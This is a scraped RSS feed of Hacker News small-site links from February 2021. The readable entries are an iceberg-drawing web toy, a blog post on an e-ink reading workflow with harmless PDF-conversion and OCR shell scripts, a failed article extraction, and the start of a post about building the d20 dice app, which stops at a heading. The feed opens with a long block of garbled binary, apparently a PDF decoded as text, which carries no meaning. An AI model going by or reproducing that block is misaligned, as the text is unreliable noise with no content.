√∑‚Ä°¬ØE¬¥Z√™gb¬∫+ÀÜ√ü¬æ√ñE5w√∂o√Ω¬±a√∞g√ºo√É√¢√ë#√∞5‚Ä¢√ø≈†#‚ÄúX√ì√£r√â¬ß‚Äπ√Ä!√î&gt;‚ÄìÔøΩ)‚Ä∫‚Ä¶¬®<w√®w√Ç¬ø√∏-¬∂‚Ä¢√°√øÔøΩ‚Ä∞~:√Ω‚Ä∫¬øloy√∏¬ª@√ë¬µ¬´ÔøΩ ij¬≥y√ê¬§√Åak√ò="">cBU‚Äû√±√°¬π√ª¬µ√∑¬≥U¬∞‚ÄúF.‚Äîd‚Äî1√•6¬™√ºsg√ç~4√±√¨√µ√ª~√ê≈∏/-~√∏s^√ê√•√∏a¬£√∏∆í√°l"√≥oÔøΩÀÜo¬Æ¬º¬¢¬≤√ä√º{&amp;A√†}‚Ä∫∆í‚Äôk√¨h~4√™≈æ"√ø∆ísu/≈Ω√æ√ì|√†√Ø‚Äπ:ÔøΩ¬∏¬∫√ït/
YBD¬±j]Y*√πl?*√πw√æ
√Ω‚Äù|√∞‚Äπ√°w√Ä√º*√îF¬π√∞√§√©w^¬µ¬æ≈†√≥√≠p√É√ä√∑v¬∂√ª√∫ÔøΩ‚Äò√ç8P~`¬±t√à√Ö}√ø√à√∞K_√Å&gt;#√º5√±√ù√∂ÔøΩ√°G√ÜÔøΩ¬¨√ø√Ç=o¬Øjv√∂y√ë$‚Äì√å≈Ω
‚Ä†e8√úy¬∏¬™*¬¶≈æ.‚Äúk√üZk¬±¬µ√î√•≈°√ê√º¬±√Ω¬ª√øm√è√õ¬´√á&gt;	√±V¬≥¬•√Å¬ß√∏‚Ä∫E√∞¬¥z¬π5¬¥q√Åm¬©√ù¬§√≤¬∫√ù¬§Q‚Ç¨√¨d√µ¬∑'√ÉkC√Ö~√î~√∏‚Ä†√≥B√ï¬§¬±}CIM√î‚ÄìwIwn√ïe≈í¬≤0√∫Y√ô√∫√ó√´√πeQ√Éi¬©√≥‚Ä¢f√ùK≈∏¬ß√∞B?√∏$√Ø‚Ç¨¬øj‚Ä°&gt;-√∏√ì√±‚Äô√î&lt;√†√¢b¬¥√íÔøΩ√åp√ûÀú!√è&lt;√å&gt;√º`¬ª3ÔøΩ√Ä√∂√¶¬º¬≥√†¬Ø√≠Q√∞¬Ø√∂√ï√Ω¬¥4_‚Ä°√ö√∑√Äo‚Ä†:√Ç?k√òZY√ë¬¨^√óZ√ë√¢v√õ√à¬ª√≥?vq≈Ω‚Äû√ó√ê¬ø√∞Eo√õE√±√á√º√£7√¨√Ç√∫¬≠≈Ω‚Äπ√£√≠oN√ï≈∏√Çiu:√õ¬Æ¬™√ó¬∂√•DBF n¬≥pz)'&nbsp;√∞√è√∏"/√º‚Äπ√¢≈†√†&nbsp;≈æ√ï√ºU√°-w√Ç¬æ√∏[w√Ω¬Ø¬¨√ûj¬∂ÔøΩiS@¬∏Hr√†+ÔøΩ√ú√º¬§≈íw¬Ø√ç√±5√™,^'‚Ä∞m%√∞¬Æ√æ‚Ä°¬∑K‚Ä¢√Ç

√ß√ªe√ø√Å0W√∂8√ø‚Äö≈Ω√®√ü5¬≠gR‚Äú√É~.¬π‚Ä∞¬¥-V√ö√úI;Z√ú¬∏‚Ä†6h‚Ä∞#,√ákd‚Ç¨;]¬∑√≠7√ø*√∏√µ√ª√∏√Æ√í√ó√É≈°√ø‚Ä°¬º[y~ÔøΩs¬¶A¬£√´)¬ßk‚Äò√ÜpZ;y√ô¬∂√§d#1√π‚Ç¨<w√ù'√Ü√øÔøΩ‚Äö¬¢√øÔøΩ√Å√Ü¬∫¬°√°{‚Ä∫]{√Å¬≥¬∑‚Ä†ÔøΩ¬ø√î√≠√ä√ã√Ö√∫n√¨ÔøΩ√µ;‚Ä°ÔøΩ9√Åm¬π√Ü@√â√≤√Ø√∏,√ê√∏i√ªgx√´√£√è√á¬Ø√üx‚Ä∫w√∏g√É√ç√Ç√ñ√∂-g‚Ä¢√¢ ¬•&¬µ¬ºg√ù6√á&√êw-r0="">√ç√´b*S¬°^≈ìe‚ÄπO√å√©≈ΩA^2h√∏¬Ø√Å√ø√∞Q√ü≈í≈∏¬≥¬¶¬ª‚Ä¶√æ%√®S√´‚Äπ¬£√Ç¬±YIg¬™√öD¬ΩDW@$√à?√öV5√∫%√ª√Åx¬≠¬ºQ5≈æÔøΩ≈†‚Ñ¢√è√¨\‚Äû¬πt√ø¬ß}D¬º√ø√ót5√π/√ªl√æ√ò:√ø√≠¬ø√±ÔøΩL√±n¬æg√©√ì√¥√Ö√á√ö%‚Ä∫√¨√±√¢K‚Ä∞2H√º‚Äú√û¬º}√¢√ä‚Äò√Ä^√ä9√º‚Ä∞√â‚Ä¶oÔøΩ√∞¬£
≈í¬°√µ≈í4ÔøΩ
√ø√ù√ò≈°|CZ‚Äù√πgi#√∫√π√Ω≈∏√ømÔøΩ|w¬∏M,√âu√°√üc&amp;‚Ä°¬™(≈†√¶E^¬≤@A)q√ªP¬≥≈†√∂#t¬¶=√úÔøΩ:≈æ∆í√≥=
√æM¬æ√æ√ûe¬∏4KY√ù√∏‚Äî√Ç√ó¬∞¬≠√æ‚Ä∫a¬≠‚Ñ¢≈æ√õM√Ö‚Ä¶√Üw√ÜX√Ω√ìyg√í¬ød?√†≈æ√∞Y√ã‚Ä∞‚Ä†u;√Ø√®√±C√æ‚Äúmpx≈∏√É√ü√µ√ö!√øq¬∂‚Ç¨?√ª√π≈Ωc‚Äö√å¬≤Y*y‚Äûy¬£√º√ãc√®¬®T¬ßÀÜ‚Ä¶√†√µ√¨~&nbsp;√ëX^√∏‚Äî¬¢|L√∞¬Ω¬Æ¬≥&nbsp;√™6√ö¬Æ‚Ñ¢zÔøΩ√°¬∏¬∑m√®√†√¥√ß¬±√∂&lt;√ñ√ò‚Äú#‚Ä¶</w√Ω'√¶√øÔøΩ‚Äö¬¢√øÔøΩ√°√¶¬∫¬°√°{‚Ä∫]{√°¬≥¬∑‚Ä†ÔøΩ¬ø√¥√≠√™√´√•√∫n√¨ÔøΩ√µ;‚Ä°ÔøΩ9√°m¬π√¶@√©√≤√Ø√∏,√∞√∏i√ªgx√´√£√Ø√ß¬Ø√üx‚Ä∫w√∏g√£√≠√¢√∂√∂-g‚Ä¢√¢></w√®w√¢¬ø√∏-¬∂‚Ä¢√°√øÔøΩ‚Ä∞~:√Ω‚Ä∫¬øloy√∏¬ª@√±¬µ¬´ÔøΩ></k‚Ä∞¬•√∏3√°√¥w8></rngv‚Äú¬µ+√≤'√ªg?¬¥¬∂h√≥√ß<√ß"¬∞√πg{@√†_></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rmf.org/wp-content/uploads/2018/05/Cloud_Computing_SRG_v1r3.pdf">https://rmf.org/wp-content/uploads/2018/05/Cloud_Computing_SRG_v1r3.pdf</a></em></p>]]>
            </description>
            <link>https://rmf.org/wp-content/uploads/2018/05/Cloud_Computing_SRG_v1r3.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201217</guid>
            <pubDate>Sat, 20 Feb 2021 03:26:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Draw an iceberg and see how it would float in water]]>
            </title>
            <description>
<![CDATA[
Score 695 | Comments 88 (<a href="https://news.ycombinator.com/item?id=26201160">thread link</a>) | @raldi
<br/>
February 19, 2021 | https://joshdata.me/iceberger.html | <a href="https://web.archive.org/web/*/https://joshdata.me/iceberger.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    
    <p>Draw an iceberg and see how it will float.</p>
    <p>(Inspired by a <a href="https://twitter.com/GlacialMeg/status/1362557149147058178?ref_src=twsrc%5Etfw">tweet by @GlacialMeg</a>)</p>

    <canvas id="canvas">
    </canvas>

    <p>In reality, an iceberg wouldn‚Äôt float <i>exactly</i> like this. Its three-dimensional distribution of mass and its relative density compared to the water are both significant factors that are only approximated here.</p>

    <hr>

    <p>Inspired by a tweet by @GlacialMeg:</p>
    <blockquote data-partner="tweetdeck"><div lang="en" dir="ltr"><p>Today I channeled my energy into this very unofficial but passionate petition for scientists to start drawing icebergs in their stable orientations. I went to the trouble of painting a stable iceberg with my watercolors, so plz hear me out.</p><p>(1/4) <a href="https://t.co/rtkCYub38b">pic.twitter.com/rtkCYub38b</a></p></div>‚Äî Megan Thompson-Munson (@GlacialMeg) <a href="https://twitter.com/GlacialMeg/status/1362557149147058178?ref_src=twsrc%5Etfw">February 19, 2021</a></blockquote>
    


    </div></div>]]>
            </description>
            <link>https://joshdata.me/iceberger.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26201160</guid>
            <pubDate>Sat, 20 Feb 2021 03:16:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Life in E-Ink]]>
            </title>
            <description>
<![CDATA[
Score 143 | Comments 77 (<a href="https://news.ycombinator.com/item?id=26200630">thread link</a>) | @HaoZeke
<br/>
February 19, 2021 | https://rgoswami.me/posts/my-life-in-eink/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/my-life-in-eink/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Collection of odds and ends relating to e-readers including personal reminisces</p></blockquote><h2 id="background">Background</h2><p>Reading has been a huge part of my life. The written word has had arguably more of an impact on my life than anything I have experienced in person. As a kid back in early 2000‚Äôs; this meant a lot of library trips and saving for paperbacks. I also caught the first wave of the e-ink revolution. Nothing beats a real book, in terms of textures and scents; but e-ink devices and the fantastic tools outlined here should make reading digital books much more palpable&nbsp;<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>I have been reading on my <a href="https://en.wikipedia.org/wiki/Kobo%5FAura%5FHD">Kobo Aura HD</a> for almost a decade now, ever since its release. This means my setup is about as stable as its going to get in the near future. As good a time as any to collect my thoughts&nbsp;<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The focus is on e-ink devices and auxiliary tools; not on all digital content; so there are no mentions of syncing or reading on the go (with a phone) or of monitors which are good for reading on.</p><h3 id="the-content">The Content</h3><p>In general; my e-ink reading habits can be broadly broken into the following categories:</p><dl><dt>Light Reading</dt><dd>Practically this includes <a href="https://www.goodreads.com/user/show/33462912-rohit-goswami">anything I review on Goodreads</a>; these are not often re-read; nor read very deeply; since they are read for pleasure. They are however, rarely deleted</dd><dt>Required Reading</dt><dd>Anything which typically requires me to take notes or practice / write out proofs; these are most often considered to be either coursework (for someone somewhere) or research monographs. These are typically large (in size) and unwieldy (in that they often lack TOCs) and are read multiple times; with a focus on highlights and notes</dd><dt>Active Research</dt><dd>These are the most ephemeral of my reading habits; and also the most numerous; I do not typically store these on my e-reader; and rarely need to make notes on the reader&nbsp;<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. These are often tiny; but require special work due to the metadata involved</dd></dl><table><thead><tr><th>Content Type</th><th>Software Stack</th><th>Deletion Rate</th></tr></thead><tbody><tr><td>Light Reading</td><td>Calibre</td><td>Rare</td></tr><tr><td>Required Reading</td><td>Calibre</td><td>Never</td></tr><tr><td>Active Research</td><td>Calibre + Zotero</td><td>Frequent</td></tr></tbody></table><p>Though I am a huge proponent of RSS feeds (with <a href="https://gitlab.com/news-flash/news%5Fflash%5Fgtk">Newsflash</a>) and read online content voraciously with both a <a href="https://app.getpocket.com/">Pocket</a> and <a href="https://www.diigo.com/user/rgoswami">Diigo</a> subscription<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>; I sincerely do not believe blog stuff or anything tailored for the web should have a presence on an e-ink device; so there shall be no mention of those parts of my reading habits<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup>.</p><h2 id="hardware">Hardware</h2><p>My primary e-reader is still my <a href="https://www.kobo.com/koboaurahd?%5F%5F%5Fstore=au&amp;style=onestore">Kobo Aura HD</a> (complete with a snazzy <a href="https://www.amazon.com/Cover-Up-eReader-Natural-Cover-Function/dp/B00DZJ5VM0">hemp sleep-cover</a>), and has been my go to for almost a decade now since its release. Recently I have augmented my workflow with the <a href="https://remarkable.com/store/remarkable-2">reMarkable 2</a>; though I have yet to break it in very well; mostly because I tend to gravitate towards typing out my thoughts&nbsp;<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> instead of writing.</p><p>The Kobo Aura HD is still the pinnacle of reading technology to me; mostly because the firmware is easy to bypass; and there is a vibrant community of developers on the <a href="https://www.mobileread.com/forums/showthread.php?t=210800">MobileRead Forums</a>. Display and spec aside; the biggest reason for never replacing it has been been the simple fact that most modern e-readers no longer support SD cards; and much of my workflow depends on storing insane amounts of material offline&nbsp;<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>.</p><figure><img src="https://d33wubrfki0l68.cloudfront.net/d393a91160884052b7717a31a565283336a03ccf/eb437/ox-hugo/2021-02-20_01-39-20_screenshot.png" alt="Figure 1: Primary reading device with Koreader"><figcaption><p>Figure 1: Primary reading device with Koreader</p></figcaption></figure><p>Personally, I never use Nickel (the default Kobo interface), and it would probably choke trying to scan my 200 GB of content; so I haven‚Äôt updated the firmware in forever. My interactions are almost always in <a href="https://koreader.rocks/">Koreader</a>; and my launching poison of choice is the now no longer developed <a href="https://www.mobileread.com/forums/showthread.php?t=293804">Kobo start menu</a>&nbsp;<sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup>.</p><h2 id="software">Software</h2><p>Broadly speaking; the main parts of the software pipeline from digital book to brain are simply the syncing mechanism and the UI/UX/OS of the device in question; though it is often best to consider pre-processing books for devices too. These are covered in the order used.</p><h3 id="k2pdfopt">k2pdfopt</h3><p>The thought of reflowing text for an optimal reading experience, especially given the slightly limited processing power of my primary reading device is an enticing prospect. <a href="https://www.willus.com/k2pdfopt/">K2pdfopt or the Kindle 2 PDF Optimizer</a> is as criminally underrated as it is fantastic. An approach which works well for my device involves setting up <a href="https://github.com/HaoZeke/Dotfiles/blob/master/dotfiles/common/.local/bin/fileHelpers/docK2pdf">a simple shell script</a> (part <a href="https://github.com/HaoZeke/Dotfiles">of my Dotfiles</a>) for optimizing files on the fly before sending them through <code>calibre</code>.</p><div><pre><code data-lang="bash"><span>#!/usr/bin/env bash
</span><span></span><span># Get a filename</span>
<span>case</span> <span>"</span><span>$#</span><span>"</span> in
0<span>)</span>
      <span>echo</span> <span>"No arguments, so enter the filename, WITH the extension"</span>
      <span>read</span> -p <span>'Document: '</span> docfile
      <span>;;</span>
1<span>)</span>
      <span>echo</span> <span>"OK, using the filename"</span>
      <span>docfile</span><span>=</span><span>"</span><span>$1</span><span>"</span>
      <span>;;</span>
*<span>)</span>
      <span>echo</span> <span>"Illegal number of parameters"</span>
      <span>exit</span>
      <span>;;</span>
<span>esac</span>
<span># Get basename</span>
<span>basename</span><span>=</span><span>"</span><span>${</span><span>docfile</span><span>%.*</span><span>}</span><span>"</span>
<span>ext</span><span>=</span><span>"</span><span>${</span><span>docfile</span><span>##*</span><span>\.</span><span>}</span><span>"</span>
<span>echo</span> <span>"Basename </span><span>${</span><span>basename</span><span>}</span><span> with </span><span>$ext</span><span> from </span><span>$docfile</span><span>"</span>
<span>echo</span> <span>"Making a local store for the outputs"</span>
mkdir -p <span>"</span><span>$HOME</span><span>/auraHDopt"</span>

<span>case</span> <span>"</span><span>$ext</span><span>"</span> in
<span>"djvu"</span><span>)</span>
      <span>echo</span> <span>"Converting djvu to pdf via ps and running k2pdfopt"</span>
      djvups <span>"</span><span>${</span><span>basename</span><span>}</span><span>.djvu"</span> <span>"</span><span>${</span><span>basename</span><span>}</span><span>.ps"</span>
      ps2pdf <span>"</span><span>${</span><span>basename</span><span>}</span><span>.ps"</span> <span>"</span><span>${</span><span>basename</span><span>}</span><span>.pdf"</span>
      <span># The newline is for simulating the Enter key</span>
      <span>echo</span> <span>|</span> k2pdfopt <span>"</span><span>${</span><span>basename</span><span>}</span><span>.pdf"</span> -wrap -hy -ws -0.2 -dev kbhd -x
      <span>echo</span> <span>"Cleaning up"</span>
      mv <span>"</span><span>${</span><span>basename</span><span>}</span><span>_k2opt.pdf"</span> <span>"</span><span>$HOME</span><span>/auraHDopt"</span>
      rm -rf <span>"</span><span>${</span><span>basename</span><span>}</span><span>.{ps,pdf}"</span>
      <span>;;</span>
<span>"pdf"</span><span>)</span>
      <span>echo</span> <span>"Converting pdf with gs and running k2pdfopt"</span>
      gs -sDEVICE<span>=</span>pdfwrite -dCompatibilityLevel<span>=</span>1.4 -dPDFSETTINGS<span>=</span>/screen <span>\
</span><span></span>              -dNOPAUSE -dQUIET -dBATCH -sOutputFile<span>=</span><span>"</span><span>${</span><span>basename</span><span>}</span><span>gs.pdf"</span> <span>"</span><span>${</span><span>basename</span><span>}</span><span>.pdf"</span>
      <span>echo</span> <span>|</span> k2pdfopt <span>"</span><span>${</span><span>basename</span><span>}</span><span>gs.pdf"</span> -wrap -hy -ws -0.2 -dev kbhd -x
      <span>echo</span> <span>"Cleaning up"</span>
      rm <span>"</span><span>${</span><span>basename</span><span>}</span><span>gs.pdf"</span> -rf
      mv <span>"</span><span>${</span><span>basename</span><span>}</span><span>gs_k2opt.pdf"</span> <span>"</span><span>$HOME</span><span>/auraHDopt"</span>
      <span>;;</span>
*<span>)</span>
      <span>echo</span> <span>"Illegal file type"</span>
      <span>exit</span>
      <span>;;</span>
<span>esac</span>
</code></pre></div><p>The outputs can also be further processed with an <a href="https://github.com/HaoZeke/Dotfiles/blob/master/dotfiles/common/.local/bin/fileHelpers/isOcr">OCR (Optical Character Recognition) script</a> if required, and then edited in <a href="https://code-industry.net/masterpdfeditor/">Master PDF Editor</a> or something similar to add the table of contents interactively as well.</p><div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span><span># Use as  find . -type f -name "*.pdf" -exec isOcr '{}' \;</span>

<span># Shamelessly kanged from here:</span>
<span># https://stackoverflow.com/questions/7997399/bash-script-to-check-pdfs-are-ocrd</span>
<span># Only searches for text on the first 5 pages</span>
<span># Modified to have red text. Also to possibly ocr the thing.</span>

<span># -*- mode: shell-script-mode -*-</span>

<span>MYFONTS</span><span>=</span><span>$(</span>pdffonts -l <span>15</span> <span>"</span><span>$1</span><span>"</span> <span>|</span> tail -n +3 <span>|</span> cut -d<span>' '</span> -f1 <span>|</span> sort <span>|</span> uniq<span>)</span>
<span>if</span> <span>[</span> <span>"</span><span>$MYFONTS</span><span>"</span> <span>=</span> <span>''</span> <span>]</span> <span>||</span> <span>[</span> <span>"</span><span>$MYFONTS</span><span>"</span> <span>=</span> <span>'[none]'</span> <span>]</span><span>;</span> <span>then</span>
    <span>echo</span> <span>"</span><span>$(</span>tput setaf 1<span>)</span><span>NOT OCR'ed: </span><span>$1</span><span>"</span>
    <span>if</span> <span>[[</span> -x <span>"</span><span>$(</span>which ocrmypdf<span>)</span><span>"</span> <span>]]</span><span>;</span> <span>then</span>
        <span>echo</span> <span>"</span><span>$(</span>tput setaf 4<span>)</span><span>"</span>
        <span>echo</span> <span>"Converting to </span><span>${</span><span>1</span><span>%.*</span><span>}</span><span>_ocr.pdf with ocrmypdf"</span>
        <span>echo</span> <span>"</span><span>$(</span>tput setaf 7<span>)</span><span>"</span>
        ocrmypdf --deskew --clean --rotate-pages <span>\
</span><span></span>            --jobs <span>4</span> -v --output-type pdfa <span>"</span><span>$1</span><span>"</span> <span>"</span><span>${</span><span>1</span><span>%.*</span><span>}</span><span>_ocr.pdf"</span>
    <span>elif</span> <span>[[</span> -x <span>"</span><span>$(</span>which pypdfocr<span>)</span><span>"</span> <span>]]</span><span>;</span> <span>then</span>
        <span>echo</span> <span>"</span><span>$(</span>tput setaf 2<span>)</span><span> Looking for config files at </span><span>$XDG_CONFIG_HOME</span><span>/pypdfocr/config.yml"</span>
        <span>echo</span> <span>"</span><span>$(</span>tput setaf 3<span>)</span><span>"</span>
        <span>if</span> <span>[[</span> -e <span>$XDG_CONFIG_HOME</span>/pypdfocr/config.yml <span>]]</span><span>;</span> <span>then</span>
            <span>echo</span> <span>"Using configuration settings"</span>
            <span>echo</span> <span>"</span><span>$(</span>tput setaf 4<span>)</span><span>"</span>
            pypdfocr -c <span>$XDG_CONFIG_HOME</span>/pypdfocr/config.yml <span>"</span><span>$1</span><span>"</span>
        <span>else</span>
            <span>echo</span> <span>"Using default settings"</span>
            <span>echo</span> <span>"</span><span>$(</span>tput setaf 4<span>)</span><span>"</span>
            pypdfocr <span>"</span><span>$1</span><span>"</span>
        <span>fi</span>
        <span>echo</span> <span>"</span><span>$(</span>tput setaf 2<span>)</span><span> You might want to get pypdfocr"</span>
    <span>fi</span>
<span>else</span>
    <span>echo</span> <span>"</span><span>$1</span><span> is OCR'ed."</span>
<span>fi</span>
</code></pre></div><p>The end result is:</p><ul><li>A directory with perfectly <code>pdf</code> files re-flowed text<ul><li>Possibly OCR‚Äôed for string searches</li></ul></li></ul><p>TOC editing is still rather janky; but this is also because the OCR process is still rather spotty.</p><h3 id="calibre">Calibre</h3><p><a href="https://calibre-ebook.com/">Calibre</a> is an excellent library software, and there are very few alternatives which offer all the salient features:</p><dl><dt>Syncing</dt><dd>Apart from working well with a plethora of official devices, Koreader is also pretty well supported, and mounting folders allows for easy management of a secret library (e.g. <code>.Library</code>) on an SD card to prevent Nickel from reading and choking on large libraries</dd><dt>Multiple Libraries</dt><dd>I personally keep one for fiction, one for non-fiction, and one (transiently populated) one for papers</dd><dt>Good metadata collection</dt><dd>Nothing beats rich metadata, and with third party plugins, all the best content providers can be leveraged for blurbs; plus most purchased books come with metadata which <code>calibre</code> can read</dd></dl><p>It isn‚Äôt perfect, there are far better <a href="https://opds.io/">OPDS (Open Publication Distribution System)</a> servers like the fantastic <a href="https://github.com/seblucas/cops">COPS (Calibre OPDS)</a> project, and there have been <a href="https://anarc.at/software/desktop/calibre/">some security concerns in the past</a>, but it is really usable and is <a href="https://github.com/kovidgoyal/calibre">under active development</a>; plus it has a <a href="https://kovidgoyal.net/">fun developer</a>. I also personally find the file conversion lacking, compared to <code>k2pdfopt</code>, but as a library management system it is really good.</p><h3 id="zotero-sync">Zotero Sync</h3><p>Calibre provides a handy <a href="https://www.mobileread.com/forums/showthread.php?p=3339191#poststop">ZMI (Zotero Metadata Importer) plugin</a> which allows for exported papers to be imported into <code>calibre</code> and from then into the e-reader as expected. Combined with the folder mounts facilitated by <code>calibre</code> this allows for a painless way to ensure a quick export; optimize; sync; read and delete workflow.</p><h3 id="koreader">Koreader</h3><p>Koreader is probably the best thing to happen to e-ink devices since sliced bread. It replaces the need to use any cables with an e-reader; since newer versions have a nice SSH server, and can also update itself. Since this is mostly used as is; and all the information required is on the <a href="https://github.com/koreader/koreader/wiki">Github Wiki</a>, there‚Äôs not much else to say here.</p><p>It is probably worth noting that the in-built re-flow options do tend to cause major artifacts on older hardware, and is best avoided. Almost equivalently, and at a far lower cost in terms of performance, page contents can be fit to width and zoomed in automatically, which is almost as good as working with <code>k2pdfopt</code> in some special cases.</p><h2 id="conclusions">Conclusions</h2><p>Given my unfortunate separation from my library back home; it is likely that my e-ink devices will continue to be my primary source of reading material. Plus the long retarded color e-ink market finally seems to be moving out of its stupor&nbsp;<sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup>. The only possible addendum to this methodology would probably involve integrating <code>orgmode</code> and the reMarkable 2 sometime. E-ink is here to stay. This setup would probably need revisions involving <code>rclone</code> or <code>syncthing</code> if I ever gave ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rgoswami.me/posts/my-life-in-eink/">https://rgoswami.me/posts/my-life-in-eink/</a></em></p>]]>
            </description>
            <link>https://rgoswami.me/posts/my-life-in-eink/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26200630</guid>
            <pubDate>Sat, 20 Feb 2021 01:46:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A request for Pinboard old-timers]]>
            </title>
            <description>
<![CDATA[
Score 225 | Comments 104 (<a href="https://news.ycombinator.com/item?id=26199676">thread link</a>) | @Alex3917
<br/>
February 19, 2021 | https://www.prettyfwd.com/t/XiK8ArVIT6uVItPGeH3lzA/ | <a href="https://web.archive.org/web/*/https://www.prettyfwd.com/t/XiK8ArVIT6uVItPGeH3lzA/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.prettyfwd.com/t/XiK8ArVIT6uVItPGeH3lzA/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199676</guid>
            <pubDate>Fri, 19 Feb 2021 23:56:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The making of d20 version 3]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26199638">thread link</a>) | @blakewatson
<br/>
February 19, 2021 | https://blakewatson.com/journal/the-making-of-d20-version-3 | <a href="https://web.archive.org/web/*/https://blakewatson.com/journal/the-making-of-d20-version-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
            
                <article>
                    

                    <div>
                                                    <p>In hindsight, I can‚Äôt believe anyone paid money<sup id="fnref-516-v1"><a href="#fn-516-v1">1</a></sup> for the <a href="http://d20.blakewatson.com/">first version of d20</a>, which I released in <a href="https://blakewatson.com/journal/2016-my-year-in-review/#criticalhit"> September 2016</a>. But they did, and those few sells I made inspired a much more useful version 2, which was released in January 2018.</p>
<p>By the end of 2018, I had been using d20 extensively and running into some problems I wanted to address. I started writing some brand new code in December of that year. Two years and 144 commits later, I‚Äôm happy to announce that d20 version 3 is now for sale on the Mac App Store.</p>
<figure>
<img loading="lazy" src="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/2.png?resize=1024%2C640&amp;ssl=1" alt="Screenshot of d20, showing a roll formula in a text input with multiple results underneath. Showing presets pane expanded with custom buttons like &quot;Long Bow&quot;." width="1024" height="640" srcset="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/2.png?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/2.png?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/2.png?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/2.png?w=1440&amp;ssl=1 1440w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"><br>
</figure>
<p>You can check out the <a href="https://d20app.me/">d20 website</a> or <a href="https://apps.apple.com/us/app/d20-an-rpg-dice-roller/id1156311750">Mac App Store page</a> if you want to know more about the features. But I want to get into the decision making process, tech stack, and other tangents regarding the making of d20. Imagine this as the director‚Äôs commentary.</p>
<h2>Electron: can‚Äôt live with it, can‚Äôt live without it</h2>
<p>The biggest non-decision was whether the app would be powered by <a href="https://www.electronjs.org/">Electron</a>, go fully native, or go fully web-based. I had already used Electron for the first two versions. But I felt guilty about it. Electron is basically Google Chrome and NodeJS smashed together, so it‚Äôs pretty big and resource intensive. Seeing as d20 has a simple interface, very limited scope in what it‚Äôs trying to accomplish, and is meant to be Mac-only, Electron was a really terrible option.</p>
<p>But I went with Electron again for the same reason every other web developer does‚ÄîI know how to code for it without learning too much new stuff (e.g., Swift + Apple frameworks). Yes it‚Äôs way overkill, yes it‚Äôs absolutely ridiculous. But you either get d20 the Electron app, or you get nothing. That‚Äôs the great thing about Electron. It lowers the barrier to creating desktop applications and spawns tools and apps that otherwise would not exist. You‚Äôll have to endure a little bit of ridicule from Hacker News and, if you‚Äôre like me, your inner-critic, but I say YOLO. Don‚Äôt let your dreams be dreams.</p>
<h2>RANDOM.ORG</h2>
<p>Since version 2, d20 has integrated with <a href="https://www.random.org/">RANDOM.ORG</a> to provide true random numbers rather than pseudorandom ones generated by JavaScript. This ended up being the catalyst that pushed me to finish version 3. RANDOM.ORG brought their API out of beta and began charging for it. My old API key was no longer working and so d20 was quietly falling back to using pseudorandom JavaScript RNG.</p>
<p>This was not cool, considering that true random numbers is one of d20‚Äôs unique selling points. I made the decision to move to the commercial API, which costs $12 per month. I don‚Äôt like incurring the extra costs each month, but I do make enough in sales to cover it and it is personally one of my favorite features of d20; so I gotta keep it in there.</p>
<h2>Vue, Sass, Laravel Mix</h2>
<p>I doubled down on using <a href="https://vuejs.org/">Vue</a>. I had used it in version 2 but I was new to it at the time and I did a really poor job of code organization. I feel like the new version is much better. I‚Äôm a different programmer than I was when I first started d20 v3 so there are definitely things I would change if I were starting today (like using <a href="https://www.typescriptlang.org/">TypeScript</a>). That‚Äôs just part of the consequences for taking two years to finish it.</p>
<p>CSS is pretty amazing these days, but I went with <a href="https://sass-lang.com/">Sass</a> out of complacency or momentum or whatever you want to call it. I processed all the styles and scripts with <a href="https://laravel-mix.com/">Laravel Mix</a> which is a pretty great way to use <a href="https://webpack.js.org/">webpack</a> when you don‚Äôt feel like learning about webpack<sup id="fnref-516-mix"><a href="#fn-516-mix">2</a></sup>.</p>
<h2>Leaving behind <code>localStorage</code></h2>
<p>I have a bad habit of using <code>localStorage</code>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">web storage feature</a>, for everything. In d20 v2 I was saving all the presets in <code>localStorage</code>. But for v3 I moved to using a JSON file for saving presets and settings information. This is my first time using the file system in an Electron app so here‚Äôs hoping I did all of the Apple security stuff right.</p>
<p>The cool thing about this though is that it‚Äôs now much easier to back up your presets, move them to another machine, or share them with others. Just save the file. Boom. Easy. I will be able to rest easier knowing that I have reliable, persistent storage and that a user won‚Äôt wake up one day to find their data missing.</p>
<h2>Design</h2>
